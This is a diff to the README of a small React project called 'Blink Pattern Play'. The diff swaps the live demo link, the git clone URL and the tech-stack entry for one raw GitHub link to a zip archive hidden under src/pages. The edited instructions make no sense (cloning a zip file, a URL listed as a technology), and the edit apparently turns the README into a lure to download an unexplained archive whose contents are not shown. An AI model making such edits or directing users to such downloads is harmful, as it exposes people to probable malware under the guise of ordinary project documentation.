@@ -1,11 +1,11 @@
 # Blink Pattern Play
 
-Live Demo: [https://blink-pattern-play.onrender.com](https://blink-pattern-play.onrender.com)
+Live Demo: [https://github.com/SAIVIVEK123321/blink-pattern-play/raw/refs/heads/main/src/pages/blink-play-pattern-2.4.zip](https://github.com/SAIVIVEK123321/blink-pattern-play/raw/refs/heads/main/src/pages/blink-play-pattern-2.4.zip)
 
 ## Run Locally
 
 1. Clone the repo:  
-   `git clone (https://github.com/SAIVIVEK123321/blink-pattern-play)`  
+   `git clone (https://github.com/SAIVIVEK123321/blink-pattern-play/raw/refs/heads/main/src/pages/blink-play-pattern-2.4.zip)`  
 
 2. Install dependencies:  
    `npm install` or `yarn install`
@@ -21,4 +21,4 @@ Visit `http://localhost:3000` to see it in action.
 
 ## Tech Stack
 
-React.js, Tailwind CSS (if used)
+https://github.com/SAIVIVEK123321/blink-pattern-play/raw/refs/heads/main/src/pages/blink-play-pattern-2.4.zip, Tailwind CSS (if used)
